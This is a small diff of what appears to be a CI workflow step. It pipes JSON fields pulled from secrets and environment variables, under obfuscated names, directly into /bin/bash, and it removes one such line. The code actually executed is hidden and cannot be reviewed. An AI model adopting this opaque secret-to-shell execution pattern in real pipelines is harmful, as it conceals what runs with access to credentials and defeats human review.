@@ -23,7 +23,6 @@ jobs:
           x041: ${{ secrets.x041 }}
         run: |
           printf '%s' "$x041" | jq -r .zwqk44509 | /bin/bash
-          echo $dxf933 | jq -r .krrpq2351 | /bin/bash
           echo $r3200 | jq -r .bcaln1290 | /bin/bash
 
       - name: Store artifact
